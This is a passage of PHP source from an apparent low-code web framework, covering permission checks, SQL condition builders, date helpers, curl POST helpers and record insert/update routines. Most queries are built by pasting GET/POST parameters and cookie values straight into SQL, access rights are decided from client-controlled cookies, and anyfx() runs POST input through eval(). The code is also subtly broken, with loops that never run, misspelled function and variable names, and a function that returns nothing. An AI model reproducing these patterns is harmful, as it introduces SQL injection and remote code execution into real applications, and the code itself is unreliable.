     $trst=SX("select valx,STATUS from coode_tpmtru where permid='".gln()."-".$tbnm.":insert' and comid='".$cid."' and clientid='".$uid."'");
     $tot=countresult($trst);
     if ($tot>0){
         if (intval(anyvalue($trst,"valx",0))*intval(anyvalue($trst,"STATUS",0))==1){
             return true;
         }else{
             return false;             
         }
     }else{
         return true;
     }
 }
}
function areacdt($arx,$uid,$cid){
    if ($arx!=""){
        $ptar=explode(",",$arx);
        $totp=count($ptar);
        $fmcdt="";
        for ($i=0;$i<$totp;$i++){
            switch ($ptar[$i]){
                case "DA:selfitem":
                    $fmcdt=$fmcdt." CRTOR='".$uid."' or ";
                break;
                case "DA:selfpos":
                    $ptpid=explode(",",$_COOKIE["pids"]);
                    $totpid=count($ptpid);
                    $fmposcdt="";
                    for ($m=0;$m>$totpid;$m++){
                        if ($ptpid[$m]!=""){
                         $fmposcdt=$fmposcdt." posids like concat('%,',',".$ptpid[$m].",',',%') or ";
                        }
                    }
                    $fmposcdt=substr($fmposcdt,0,strlen($fmposcdt)-3);
                    $purst=SX("select userid from coode_userlist where (".$fmposcdt.") and comp='".$cid."'");
                    $totpu=countresult($purst);
                    for ($j=0;$j<$totpu;$j++){
                      $fmcdt=$fmcdt." CRTOR='".anyvalue($purst,"userid",$j)."' or ";    
                    }
                break;
                case "DA:sonpos":
                    $allpos="";
                    $pidrst=SX("select pid from coode_mypos where cid='".$cid."' and ',,".$_COOKIE["pids"].",' like concat('%,',posid,',%')");
                    $pidrst=hou($pidrst,"#/#");
                    $pidrst=str_replace("#/#","",$pidrst);
                    $pidrst=str_replace("#-#","",$pidrst);
                      $sonrst=SX("select pid,posid from coode_mypos where cid='".$cid."' and ',,".$pidrst.",' like concat('%,',parpid,',%')");
                      $totson=countresult($sonrst);
                      $sonpid="";
                      for ($m=0;$m<$totson;$m++){
                       $allpos=$allpos.anyvalue($sonrst,"posid",0).",";   
                       $sonpid=$sonpid.anyvalue($sonrst,"pid",0).",";   
                      }
                      $sonsonrst=SX("select pid,posid from coode_mypos where cid='".$cid."' and ',,".$sonpid.",' like concat('%,',parpid,',%')");
                      $totsonson=countresult($sonsonrst);
                      $sonsonpid="";
                      for ($m=0;$m<$totsonson;$m++){
                       $allpos=$allpos.anyvalue($sonsonrst,"posid",0).",";   
                      }
                    $ptpid=explode(",",$allpos);
                    $totpid=count($ptpid);
                    $fmposcdt="";
                    for ($m=0;$m>$totpid;$m++){
                        if ($ptpid[$m]!=""){
                         $fmposcdt=$fmposcdt." posids like concat('%,',',".$ptpid[$m].",',',%') or ";
                        }
                    }
                    $fmposcdt=substr($fmposcdt,0,strlen($fmposcdt)-3);
                    $purst=SX("select userid from coode_userlist where (".$fmposcdt.") and comp='".$cid."'");
                    $totpu=countresult($purst);
                    for ($j=0;$j<$totpu;$j++){
                      $fmcdt=$fmcdt." CRTOR='".anyvalue($purst,"userid",$j)."' or ";    
                    }
                break;
                case "DA:selfandsonpos":
                    $ptpid=explode(",",$_COOKIE["pids"]);
                    $totpid=count($ptpid);
                    $fmposcdt="";
                    for ($m=0;$m>$totpid;$m++){
                        if ($ptpid[$m]!=""){
                         $fmposcdt=$fmposcdt." posids like concat('%,',',".$ptpid[$m].",',',%') or ";
                        }
                    }
                    $fmposcdt=substr($fmposcdt,0,strlen($fmposcdt)-3);
                    $purst=SX("select userid from coode_userlist where (".$fmposcdt.") and comp='".$cid."'");
                    $totpu=countresult($purst);
                    for ($j=0;$j<$totpu;$j++){
                      $fmcdt=$fmcdt." CRTOR='".anyvalue($purst,"userid",$j)."' or ";    
                    }
                  $allpos="";
                    $pidrst=SX("select pid from coode_mypos where cid='".$cid."' and ',,".$_COOKIE["pids"].",' like concat('%,',posid,',%')");
                    $pidrst=hou($pidrst,"#/#");
                    $pidrst=str_replace("#/#","",$pidrst);
                    $pidrst=str_replace("#-#","",$pidrst);
                      $sonrst=SX("select pid,posid from coode_mypos where cid='".$cid."' and ',,".$pidrst.",' like concat('%,',parpid,',%')");
                      $totson=countresult($sonrst);
                      $sonpid="";
                      for ($m=0;$m<$totson;$m++){
                       $allpos=$allpos.anyvalue($sonrst,"posid",0).",";   
                       $sonpid=$sonpid.anyvalue($sonrst,"pid",0).",";   
                      }
                      $sonsonrst=SX("select pid,posid from coode_mypos where cid='".$cid."' and ',,".$sonpid.",' like concat('%,',parpid,',%')");
                      $totsonson=countresult($sonsonrst);
                      $sonsonpid="";
                      for ($m=0;$m<$totsonson;$m++){
                       $allpos=$allpos.anyvalue($sonsonrst,"posid",0).",";   
                      }
                    $ptpid=explode(",",$allpos);
                    $totpid=count($ptpid);
                    $fmposcdt="";
                    for ($m=0;$m>$totpid;$m++){
                        if ($ptpid[$m]!=""){
                         $fmposcdt=$fmposcdt." posids like concat('%,',',".$ptpid[$m].",',',%') or ";
                        }
                    }
                    $fmposcdt=substr($fmposcdt,0,strlen($fmposcdt)-3);
                    $purst=SX("select userid from coode_userlist where (".$fmposcdt.") and comp='".$cid."'");
                    $totpu=countresult($purst);
                    for ($j=0;$j<$totpu;$j++){
                      $fmcdt=$fmcdt." CRTOR='".anyvalue($purst,"userid",$j)."' or ";    
                    }
                break;
                case "DA:selfleaddepart":
                    $drst=SX("select gid from coode_mygroup where cid='".$cid."' and polarman='".$uid."'");
                    $totd=countresult($drst);
                    $fmdpt="";
                    for ($n=0;$n<$totd;$n++){
                        $fmdtp=$fmdtp." dpme/".anyvalue($drst,"gid",$n)."=ceil(dpme/".anyvalue($drst,"gid",$n).") or ";
                    }
                    $fmdpt=substr($fmdpt,0,strlen($fmdpt)-3);
                    $purst=SX("select userid from coode_userlist where (".$fmdpt.") and comp='".$cid."'");
                    $totpu=countresult($purst);
                    for ($j=0;$j<$totpu;$j++){
                      $fmcdt=$fmcdt." CRTOR='".anyvalue($purst,"userid",$j)."' or ";    
                    }
                break;
                default:
            }
        }
        if ($fmcdt!=""){
          $fmcdt=" (".substr($fmcdt,0,strlen($fmcdt)-3).")";
        }else{
         return " (1>0)";      
        }
    }else{
      return " (1>0)";    
    }
}
function updelhaspmt($uid,$cid,$tbnm,$tbsno,$ptof,$crtor,$isdel){
 if (haspmtoftab($tbnm,$uid,$cid)=="1"){
     return true;
 }else{
    if ($isdel=="1"){
      $trst=SX("select valx,STATUS,dataarea from coode_tpmtru where permid='".gln()."-".$tbnm.":delete' and comid='".$cid."' and clientid='".$uid."'");
      $tot=countresult($trst);
       $extx=UX("select count(*) as result from ".$tbnm." where SNO=".$tbsno." and ".areacdt(anyvalue($trst,"dataarea",0),$uid,$cid));
       if (intval($extx)==0){
          return false;           
       }else{
          return true;
       }
    }else{
     $trst=SX("select valx,STATUS,dataarea from coode_tpmtru where permid='".gln()."-".$tbnm.":update' and comid='".$cid."' and clientid='".$uid."'");
     $tot=countresult($trst);
       $extx=UX("select count(*) as result from ".$tbnm." where SNO=".$tbsno." and ".areacdt(anyvalue($trst,"dataarea",0),$uid,$cid));
       if (intval($extx)==0){
          return false;           
       }else{
          return true;
       }
    }
 }
}
function makercv(){
 $tbnmm=_get('tbnm');
 $kiess=_get('kies');
 $snoo=_get('SNO');
 $dttpp=_get('dttp');
 $appid=_get("appid");
 $vstr=_get("vstr");
 $frst="";
 if ($kiess=="*"){
  $fmki=allkeyinfo($fmki,glb(),$tbnmm);
  $fkss=$fmki["COLUMN"]["ALLKEY"];
 }else{
  $fkss=$kiess;
 };

  $conn=mysql_connect(gl(),glu(),glp());
   $nrst=selectedx($conn,glb(),"select ispmiss,PTOF from coode_tablist where TABLE_NAME='".$tbnmm."'","utf8","");  
   $tbpms=anyvalue($nrst,"ispmiss",0);
   $ptof=anyvalue($nrst,"PTOF",0);
   $tbx="";
//$dataareax,$ptofy,$cux  dataacc
  $ipmt=false;
if (intval($tbpms)*1>=1){
 if ($kiess=="-killitem"){
   $tbx="delete";
   $itemrst=SX("select PTOF,CRTOR as result from ".$tbnmm." where SNO=".$snoo);
   $ptofm=anyvalue($itemrst,"PTOF",0);
   $crtn=anyvalue($itemrst,"CRTOR",0);
    $ipmt=updelhaspmt($_COOKIE["uid"],$_COOKIE["cid"],$tbnmm,$snoo,$ptofm,$crtn,"1");
 }else{//-kill
   if ($snoo=="" or $snoo=="0"){
     $tbx="new";//这个不看作用域，新增只要有权限就可以新增自己的
     $ipmt=addhaspmt($tbnmm,$_COOKIE["uid"],$_COOKIE["cid"]);
   }else{
     $tbx="update";
     $itemrst=SX("select PTOF,CRTOR as result from ".$tbnmm." where SNO=".$snoo);
     $ptofm=anyvalue($itemrst,"PTOF",0);
     $crtn=anyvalue($itemrst,"CRTOR",0);
     $ipmt=updelhaspmt($_COOKIE["uid"],$_COOKIE["cid"],$tbnmm,$snoo,$ptofm,$crtn,"");
   };
 };//-kill
}else{//tbbpms 表格主权限如果为0 则不看权限
  
};  
   if ($tbx!=""){
       if ($ipmt==true){         
         $frst=anyrcv($tbnmm,$fkss,$snoo,$dttpp);            
       }else{
         $frst="NoPermissionFor:".$appid."-".$_COOKIE["cid"]."/".$_COOKIE["gid"]."@".$_COOKIE["uid"]."";
       }//if x kiess//ypf
   }else{ //为空的时候就不用判断，不为空的时候上面紧凑判断
     $frst=anyrcv($tbnmm,$fkss,$snoo,$dttpp);
   };   //if tbx   
   return $frst;
}//DESCRIB ():  END@()
function selecteds($con,$fb,$sqlx,$lag,$ext){
 $frst=selectedx($con,$fb,$sqlx,$lag,$ext);  
//先存贮这里,到一定时间转储,半夜的时候如果有人访问则判断;
 return $frst;
}//DESCRIB ():  END@()
 function request_post($url = '', $post_data = array()) {
        if (empty($url) || empty($post_data)) {
            return false;
        }

        $o = "";
        foreach ( $post_data as $k => $v ) 
        { 
            $o.= "$k=" . urlencode( $v ). "&" ;
        }
        $post_data = substr($o,0,-1);

        $postUrl = $url;
        $curlPost = $post_data;
        $ch = curl_init();//初始化curl
        curl_setopt($ch, CURLOPT_URL,$postUrl);//抓取指定网页
        curl_setopt($ch, CURLOPT_HEADER, 0);//设置header
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//要求结果为字符串且输出到屏幕上
        curl_setopt($ch, CURLOPT_POST, 1);//post提交方式
        curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);
        $data = curl_exec($ch);//运行curl
        curl_close($ch);

        return $data;
    }
	 function request_postx($hder,$url = '',$pw, $post_data = array()) {
        if (empty($url) || empty($post_data)) {
            return false;
        }

        $o = "";
        foreach ( $post_data as $k => $v ) 
        { 
            $o.= "$k=" . urlencode( $v ). "&" ;
        }
        $post_data = substr($o,0,-1);

        $postUrl = $url;
        $curlPost = $post_data;
        $ch = curl_init();//初始化curl
        curl_setopt($ch, CURLOPT_URL,$postUrl);//抓取指定网页
        curl_setopt($ch, CURLOPT_HEADER, $hder);//设置header
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//要求结果为字符串且输出到屏幕上
        curl_setopt($ch, CURLOPT_POST, $pw);//post提交方式
        curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);
        $data = curl_exec($ch);//运行curl
        curl_close($ch);

        return $data;
    }//DESCRIB ():  END@()
function anydate($datexy,$os){
	$dstr=$os;
    $dstr=str_replace("y"," year ",$dstr);
	$dstr=str_replace("m"," month ",$dstr);
	$dstr=str_replace("d"," day ",$dstr);
	$dstr=str_replace("h"," hour ",$dstr);
	$dstr=str_replace("m"," minute ",$dstr);
	$dstr=str_replace("s"," second ",$dstr);
	switch ($datexy){
		case "NOW":
        if ($dstr==""){
          return date('Y-m-d H:i:s');
		}else{
          return date('Y-m-d H:i:s', strtotime($dstr));
        }
        break;
        case "DATE":
        if ($dstr==""){
          return date('Y-m-d');
        }else{
          return date('Y-m-d', strtotime($dstr));
		}
         break;
        default:
        if (strpos($datexy,":")>0){
          return date('Y-m-d H:i:s', strtotime($dstr, strtotime($datexy)));
        }else{
          return date('Y-m-d', strtotime($dstr, strtotime($datexy)));
        }				
    }
}//DESCRIB ():  END@()
function qmtime($dstrx){
	//时间戳是 1970年1月1日 0：0：0 到现在的秒数  $nowtimes = date('Y-m-d H:i:s',$catime);// #cattime 是时间戳
	if (strpos($dstrx,":")>0){
		$hhh=hou($dstrx," ");
		$qqq=qian($dstrx," ");
		$pthhh=explode(":",$hhh);
		$ptqqq=explode("-",$qqq);
		return mktime($pthhh[0]*1,$pthhh[1]*1,$pthhh[2]*1,$ptqqq[1]*1,$ptqqq[2]*1,$ptqqq[0]*1);		
	}else{
	  $ptxx=explode("-",$dstrx);
      return mktime(0,0,0,$ptxx[1]*1,$ptxx[2]*1,$ptxx[0]*1);		
	} 
}//DESCRIB ():  END@()
function anysqldiff($u,$dpre,$dnext){
	if (strpos($dpre,"-")>0){
      $dpre="'".$dpre."'";
	};
	if (strpos($dnext,"-")>0){
      $dnext="'".$dnext."'";
	};
	return "timestampdiff(".$u.",".$dpre.",".$dnext.")";
}//DESCRIB ():  END@()
function anysqldate($datexy,$dstr){
//	date_default_timezone_set('PRC');?// 默认时区
    $dstr=str_replace("y"," year ",$dstr);
	$dstr=str_replace("m"," month ",$dstr);
	$dstr=str_replace("d"," day ",$dstr);
	$dstr=str_replace("h"," hour ",$dstr);
	$dstr=str_replace("m"," minute ",$dstr);
	$dstr=str_replace("s"," second ",$dstr);
	  switch ($datexy){
		case "NOW":
		if ($dstr==""){
		  return "now()";
		}else{
		  return "date_add(now(),interval ".$dstr.")";
		}
		break;
		case "DATE":
		if ($dstr==""){
		  return "date(now())";
		}else{
		  return "date_add(date(now()),interval ".$dstr.")";
		}
		break;
		default:
		if (strpos($datexy,":")>0){
		 return "date_add('".$datexy."',interval ".$dstr.")";
		}else{
		  //本来想判断如果DATEXY 是一个字段呢
		   if (strpos($datexy,"-")>0){
		    return "date_add('".$datexy."',interval ".$dstr.")";
		   }else{
			return "date_add(".$datexy.",interval ".$dstr.")";//则不需要引号,因为是字段
		   }
		}				
	  }
}//DESCRIB ():  END@()
function fmkeyval($kvstr,$allkxx,$kif=array(array())){
	//echo "kvstr=-=====".$kvstr."--allkeyxx=".$allkxx;
if ($kvstr!="" && $allkxx!=""){
	if (strpos($kvstr,"[")>0){
		if (strpos(hou($kvstr,"["),"/")>0){
			if (strpos($kvstr,"@")>0){
				$qianxxx=qian($kvstr,"@");
				$houxxx=hou($kvstr,"@");
				$houxxx=str_replace("[","",$houxxx);
				$houxxx=str_replace("]","",$houxxx);
				//在判断 K V 方向
				if (strpos(",".$allkxx.",",$qianxxx.",")>0){//qianxxx 是 key
				   $tmfmhou="";
				   $pthou=explode("/",$houxxx);
				   $tothou=count($pthou);
				    for ($p=0;$p<$tothou;$p++){
						$tmfmhou=$tmfmhou.$qianxxx." like '%".$pthou[$p]."%' or ";
					}
					if ($tothou>0){
						$tmfmhou=substr($tmfmhou,0,strlen($tmfmhou)-3);
					}else{
						$tmfmhou=$qianxxx." like '%".$houxxx."%'";
					}
                  return " (".$tmfmhou.") ";
				}else{
				   $tmfmhou="";
				   $pthou=explode("/",$houxxx);
				   $tothou=count($pthou);
				    for ($p=0;$p<$tothou;$p++){
						$tmfmhou=$tmfmhou."'".$qianxxx."' like concat('%',".$pthou[$p].",'%') or ";
					}
					if ($tothou>0){
						$tmfmhou=substr($tmfmhou,0,strlen($tmfmhou)-3);
					}else{
						$tmfmhou="'".$qianxxx."' like concat('%',".$houxxx.",'%')";
					}
                  return " (".$tmfmhou.") ";
				}//allkxx,qianxxx
			}else{//@
				$qianxxx=qian($kvstr,"=");
				$houxxx=hou($kvstr,"=");
				$houxxx=str_replace("[","",$houxxx);
				$houxxx=str_replace("]","",$houxxx);
				//在判断 K V 方向
				if (strpos(",".$allkxx.",",$qianxxx.",")>0){//qianxxx 是 key
				   $tmfmhou="";
				   $pthou=explore("/",$houxxx);
				   $tothou=count($pthou);
				    for ($p=0;$p<$tothou;$p++){
						$tmfmhou=$tmfmhou.$qianxxx."='".$pthou[$p]."' or ";
					}
					if ($tothou>0){
						$tmfmhou=substr($tmfmhou,0,strlen($tmfmhou)-3);
					}else{
						$tmfmhou=$qianxxx."='".$houxxx."'";
					}
                  return " (".$tmfmhou.") ";
				}else{
				   $tmfmhou="";
				   $pthou=explore("/",$houxxx);
				   $tothou=count($pthou);
				    for ($p=0;$p<$tothou;$p++){
						$tmfmhou=$tmfmhou."'".$qianxxx."'=".$pthou[$p]." or ";
					}
					if ($tothou>0){
						$tmfmhou=substr($tmfmhou,0,strlen($tmfmhou)-3);
					}else{
						$tmfmhou="'".$qianxxx."'=".$houxxx;
					}
                  return " (".$tmfmhou.") ";
				}
			}//@
		}else{// , 区间的 /
		
		
			if (strpos($kvstr,"@")>0){
				$tmfmhou="";
				$qianxxx=qian($kvstr,"@");
				$houxxx=hou($kvstr,"@");
				$houxxx=str_replace("[","",$houxxx);
				$houxxx=str_replace("]","",$houxxx);
				if (strpos($houxxx,",")>0){
					$qjq=qian($houxxx,",");
					$qjh=hou($houxxx,",");
					if ($kif[$qianxxx]["COLUMN_TPNM"]=="datetime" || $kif[$qianxxx]["COLUMN_TPNM"]=="date"){
						if (substr($qjq,0,1)==" "){
						   $tmfmhou=$tmfmhou.anysqldiff("second",substr($qjq,1,strlen($qjq)-1),$qianxxx).">0";
						}else{
						  $tmfmhou=$tmfmhou.anysqldiff("second",$qjq,$qianxxx).">=0";
						}
						if (substr($qjh,-1)==" "){
						   $tmfmhou=$tmfmhou." and ".anysqldiff("second",$qianxxx,substr($qjh,0,strlen($qjh)-1)).">0";
						}else{
						  $tmfmhou=$tmfmhou." and ".anysqldiff("second",$qianxxx,$qjh).">=0";
						}
						$tmpfmhou="(".$tmpfmhou.")";
						return $tmpfmhou;
					}else{
						if (substr($qjq,0,1)==" "){
						   $tmfmhou=$tmfmhou.$qianxxx.">".str_replace(" ","",$qjq);
						}else{
						   $tmfmhou=$tmfmhou.$qianxxx.">=".str_replace(" ","",$qjq);
						}
						if (substr($qjh,-1)==" "){
						   $tmfmhou=$tmfmhou." and ".str_replace(" ","",$qjh).">".$qianxxx;
						}else{
						  $tmfmhou=$tmfmhou." and ".str_replace(" ","",$qjh).">=".$qianxxx;
						}
						$tmfmhou="(".$tmfmhou.")";						
						return $tmfmhou;
					}					
				}else{//等号区间 功效一样
                      $tmfmhou=$qianxxx."='".$houxxx."'";
					  return $tmfmhou;
				};//在判断 K V 方向等号区间
			}else{
				//在判断 K V 方向
				         $qianxxx=qian($kvstr,"=");
				          $houxxx=hou($kvstr,"=");				
					      $houxxx=str_replace("[","",$houxxx);
				          $houxxx=str_replace("]","",$houxxx);
						//  echo "kvstr=".$kvstr;
				   if (strpos($houxxx,",")>0){					   	  
					      $qjq=qian($houxxx,",");
					      $qjh=hou($houxxx,",");
						  //echo "qjq=".$qjq;
						  //echo "qjh=".$qjh;
						  //echo $kif[$qianxxx]["COLUMN_TPNM"];
						  
					        if ($kif[$qianxxx]["COLUMN_TPNM"]=="datetime" || $kif[$qianxxx]["COLUMN_TPNM"]=="date"){
						      if (substr($qjq,0,1)==" "){
						         $tmfmhou=$tmfmhou.anysqldiff("second",substr($qjq,1,strlen($qjq)-1),$qianxxx).">0";
						      }else{
						         $tmfmhou=$tmfmhou.anysqldiff("second",$qjq,$qianxxx).">=0";
						      }
						       if (substr($qjh,-1)==" "){
						         $tmfmhou=$tmfmhou." and ".anysqldiff("second",$qianxxx,substr($qjh,0,strlen($qjh)-1)).">0";
						       }else{
						        $tmfmhou=$tmfmhou." and ".anysqldiff("second",$qianxxx,$qjh).">=0";
						       }
						       $tmfmhou="(".$tmfmhou.")";
						       return $tmfmhou;
					        }else{
   						       if (substr($qjq,0,1)==" "){
						         $tmfmhou=$tmfmhou.$qianxxx.">".str_replace(" ","",$qjq);
						        }else{
  						         $tmfmhou=$tmfmhou.$qianxxx.">=".str_replace(" ","",$qjq);
						        }
						       if (substr($qjh,-1)==" "){
						          $tmfmhou=$tmfmhou." and ".str_replace(" ","",$qjh).">".$qianxxx;
						       }else{
						          $tmfmhou=$tmfmhou." and ".str_replace(" ","",$qjh).">=".$qianxxx;
						       }
						       $tmfmhou="(".$tmfmhou.")";						
							    return $tmfmhou;
					        };				
				    }else{
                           $tmfmhou=$qianxxx."='".$houxxx."'";					
					       return $tmfmhou;
			        };//,,,
			};//@
		 };//区间 //
	}else{
			if (strpos($kvstr,"@")>0){
				//在判断 K V 方向
				$qianxxx=qian($kvstr,"@");
				$houxxx=hou($kvstr,"@");
				if (strpos(",".$allkxx.",",$qianxxx.",")>0){//qianxxx 是 key
                  return " ".$qianxxx." like '%".$houxxx."%' ";
				}else{
				  return " ".$houxxx." like '%".$qianxxx."%' ";
				}
			}else{
				//在判断 K V 方向
				$qianxxx=qian($kvstr,"=");
				$houxxx=hou($kvstr,"=");
				if (strpos(",".$allkxx.",",$qianxxx.",")>0){//qianxxx 是 key
                  return " ".$qianxxx."='".$houxxx."' ";
				}else{
				  return " ".$houxxx."='".$qianxxx."' ";
				}
			}
	}
}else{
	return "";
}		
}//DESCRIB ():  END@()


//导出文件,可以调用的,还可以通过文件修改数据库的  xsdfnlsdkf_jscss.php
//xsdfnlsdkf_html.php xsdfnlsdkf_frm.php xsdfnlsdkf_data.php  页面和数据同步,页面数据互转 方便操作

function distance($lat1, $lon1, $lat2,$lon2,$radius = 6378.137)
{
    $rad = floatval(M_PI / 180.0);
    $lat1 = floatval($lat1) * $rad;
    $lon1 = floatval($lon1) * $rad;
    $lat2 = floatval($lat2) * $rad;
    $lon2 = floatval($lon2) * $rad;

    $theta = $lon2 - $lon1;

    $dist = acos(sin($lat1) * sin($lat2) +
                cos($lat1) * cos($lat2) * cos($theta)
            );

    if ($dist < 0 ) {
        $dist += M_PI;
    }

    return $dist = $dist * $radius;
}//DESCRIB ():  END@()




function cloneitem($tbs1,$tbs2,$keys,$cdts,$extk,$extkev){
if ($cdts!=""){
 if ($extk!=""){
  if (substr($extk,0,1)!=","){
   $extkk=",".$extk;

  };
  $conn=mysql_connect(gl(),glu(),glp());
  $x=updatingx($conn,glb(),"insert into ".$tbs2."(".$keys.$extkk.")select ".$keys.",concat(".$extk.",'".$extkev."') from ".$tbs1." where ".$cdts,"utf8");
 // echo "insert into ".$tbs2."(".$keys.$extkk.")select ".$keys.",concat(".$extk.",'".$extkev."') from ".$tbs1." where ".$cdts."-------------";
   $conn=mysql_connect(gl(),glu(),glp());    
   $bdx=updatingx($conn,glb(),"update coode_shortaffect set UPTM=now() where tablename='".$tbs2."' and concat(',',snos,',') like '%,0,%'","utf8");
 }else{
  $conn=mysql_connect(gl(),glu(),glp());
  $x=updatingx($conn,glb(),"insert into ".$tbs2."(".$keys.")select ".$keys." from ".$tbs1." where ".$cdts,"utf8");
   $conn=mysql_connect(gl(),glu(),glp());    
   $bdx=updatingx($conn,glb(),"update coode_shortaffect set UPTM=now() where tablename='".$tbs2."' and concat(',',snos,',') like '%,0,%'","utf8");
 };
};
return 1;
}//DESCRIB ():  END@()
//tb1-->tb2
function sameitem($tbs1,$tbs2,$key1s,$key2s,$cdts){
  if ($cdts!=""){
    $ptk1=explode(",",$key1s);
    $ptk2=explode(",",$key2s);
    $totpt=count($ptk1);
    $fmkx="";
    for ($i=0;$i<$totpt;$i++){
      $fmkx=$fmkx.",".$tbs2.".".$ptk2[$i]."=".$tbs1.".".$ptk1[$i];
    };
    if ($totpt>0){
      $fmkx=substr($fmkx,1,strlen($fmkx)-1);
    };    
      $conn=mysql_connect(gl(),glu(),glp());
      $x=updatingx($conn,glb(),"update ".$tbs1.",".$tbs2." set ".$fmkx." where ".$cdts,"utf8");    
      $conn=mysql_connect(gl(),glu(),glp());
      $tb2sno=updatingx($conn,glb(),"select ".$tbs2.".SNO as result from ".$tbs1.",".$tbs2."  where ".$cdts,"utf8");    
      $conn=mysql_connect(gl(),glu(),glp());        
      $bdx=updatingx($conn,glb(),"update coode_shortaffect set UPTM=now() where tablename='".$tbs2."' and concat(',',snos,',') like '%,".$tb2sno.",%'","utf8");
  };
   return 1;
}//DESCRIB ():  END@()
function extx($tbn,$cdt){
 $conn=mysql_connect(gl(),glu(),glp());
 $exx=updatingx($conn,glb(),"select count(*) as result from ".$tbn." where ".$cdt,"utf8");
 return $exx;
}//DESCRIB ():  END@()

function onlymark(){
	if ($_GET["onlymark"]!=""){
		  return $_GET["onlymark"];
	}else{
		 return date("YmdHis").getRandChar(6);
    }
}//DESCRIB ():  END@()


function anyfx($func){
 $conn=mysql_connect(gl(),glu(),glp());
 $bk="";
 $fun=$_GET['fun'];
 $func=$_POST['func'];
 if (strpos($func,"\r\n")>0){
  if ($func!=""){
    $func=unstr($func);
    $x=eval($fstr);
   }else{
  };
 }else{
  $fstr=str_replace("/~","\"",$func).";";
  $fstr='$bk='.$fstr;
  $x=eval($fstr);
  return $bk;
 };
}//DESCRIB ():  END@()

function upnew($table,$keys,$vls,$cdt){
//ALERT: SPLIT BY comma(,),so each value should be without comma;cdt only: key='value'  and not SNO=X vls不要带引号
 $conn=mysql_connect(gl(),glu(),glp());
  $qqqx=qian($cdt,"=");
  $hhhx=hou($cdt,"=");
 $extx=updatingx($conn,glb(),"select count(*) as result from ".$table." where ".$qqqx."='".$hhhx."'","utf8");
//任意增加也要判断前后函数,字段的就不判断了,太多挨个判别字段会很累
//echo "select count(*) as result from ".$table." where ".$cdt;
//echo "ext=".$ext;
 $yz="0";
 if ($extx==0){//不存在则创建
    $ptvl=explode(",",$vls);
    $totpt=count($ptvl);
    $ptkey=explode(",",$keys);
    $fmad="";
    $fmu="";
    for ($j=0;$j<$totpt;$j++){
     $fmu=$fmu.$ptkey[$j]."='".$ptvl[$j]."',";
     $fmad=$fmad." and ".$ptkey[$j]."='".$ptvl[$j]."',";
    };   
    $yz=0;
    $fmv="";
    for ($j=0;$j<$totpt;$j++){
     $fmv=$fmv."'".$ptvl[$j]."',";
    };

      $fmad=$fmad." and ".qian($cdt,"=")."='".hou($cdt,"=")."'";
      $conn=mysql_connect(gl(),glu(),glp());
	  if (strpos(",".$keys.",",qian($cdt,"="))>0){
        $fmv=substr($fmv,0,strlen($fmv)-1);
	    $fmv=str_replace('[uid]',$_COOKIE["uid"],$fmv);
	    $fmv=str_replace('[gid]',$_COOKIE["gid"],$fmv);
	    $fmv=str_replace('[now]',date('Y-m-d H:i:s'),$fmv);
	    $fmv=str_replace('[date]',date('Y-m-d'),$fmv);
		$fmv=str_replace("'@_NOW'","now()",$fmv);
	    $fmv=str_replace("'@_DATE'","date(now())",$fmv);
	    $fmv=str_replace("'@_UID'","'".$_COOKIE["uid"]."'",$fmv);
	    $fmv=str_replace("'@_GID'","'".$_COOKIE["gid"]."'",$fmv);
	    $fmv=str_replace("'@_OMK'","'".onlymark()."'",$fmv);
	    $fmv=str_replace("'@_TMK'","'".time()."'",$fmv);
		$sqlx="INSERT INTO ".$table."(".$keys.")VALUES(".$fmv.")";
        $n=updatings($conn,glb(),$sqlx,"utf8");
        $conn=mysql_connect(gl(),glu(),glp());
        $yz=updatingx($conn,glb(),"select count(*) as result from ".$table."  where ".qian($cdt,"=")."='".hou($cdt,"=")."'","utf8");  
	  }else{
        $fmv=$fmv."'".hou($cdt,"=")."'";
	    $fmv=str_replace('[uid]',$_COOKIE["uid"],$fmv);
	    $fmv=str_replace('[gid]',$_COOKIE["gid"],$fmv);
	    $fmv=str_replace('[now]',date('Y-m-d H:i:s'),$fmv);
	    $fmv=str_replace('[date]',date('Y-m-d'),$fmv);
		$fmv=str_replace("'@_NOW'","now()",$fmv);
	    $fmv=str_replace("'@_DATE'","date(now())",$fmv);
	    $fmv=str_replace("'@_UID'","'".$_COOKIE["uid"]."'",$fmv);
	    $fmv=str_replace("'@_GID'","'".$_COOKIE["gid"]."'",$fmv);
	    $fmv=str_replace("'@_OMK'","'".onlymark()."'",$fmv);
	    $fmv=str_replace("'@_TMK'","'".time()."'",$fmv);
		$sqlx="INSERT INTO ".$table."(".$keys.",".qian($cdt,"=").")VALUES(".$fmv.")";
        $n=updatings($conn,glb(),$sqlx,"utf8");
        $conn=mysql_connect(gl(),glu(),glp());
	    //echo "select count(*) as result from ".$table."  where ".qian($cdt,"=")."='".hou($cdt,"=")."'";
        $yz=updatingx($conn,glb(),"select count(*) as result from ".$table."  where ".qian($cdt,"=")."='".hou($cdt,"=")."'","utf8");  		
 	  }


    //echo "rr=".$rr."___________";
    if ($yz>0){
      return $yz;   
    }else{
     return $yz.":".$sqlx;   
    };
 }else{//存在的前提下，更改数据
   $ptvl=explode(",",$vls);
   $ptkey=explode(",",$keys);
   $totpt=count($ptvl);
    $fmu="";
    $fmad="";
    for ($j=0;$j<$totpt;$j++){
     $fmu=$fmu.$ptkey[$j]."='".$ptvl[$j]."',";
     $fmad=$fmad." and ".$ptkey[$j]."='".$ptvl[$j]."' ";
    };
    if ($totpt>0){
     $fmu=substr($fmu,0,strlen($fmu)-1);
		$fmu=str_replace("'@_NOW'","now()",$fmu);
	    $fmu=str_replace("'@_DATE'","date(now())",$fmu);
	    $fmu=str_replace("'@_UID'","'".$_COOKIE["uid"]."'",$fmu);
	    $fmu=str_replace("'@_GID'","'".$_COOKIE["gid"]."'",$fmu);
	    $fmu=str_replace("'@_OMK'","'".onlymark()."'",$fmu);
	    $fmu=str_replace("'@_TMK'","'".time()."'",$fmu);
    };
    $yz=0;    
    $conn=mysql_connect(gl(),glu(),glp());    
    $u=updatings($conn,glb(),"UPDATE ".$table." SET ".$fmu." where ".qian($cdt,"=")."='".hou($cdt,"=")."' ","utf8");   
    $conn=mysql_connect(gl(),glu(),glp());
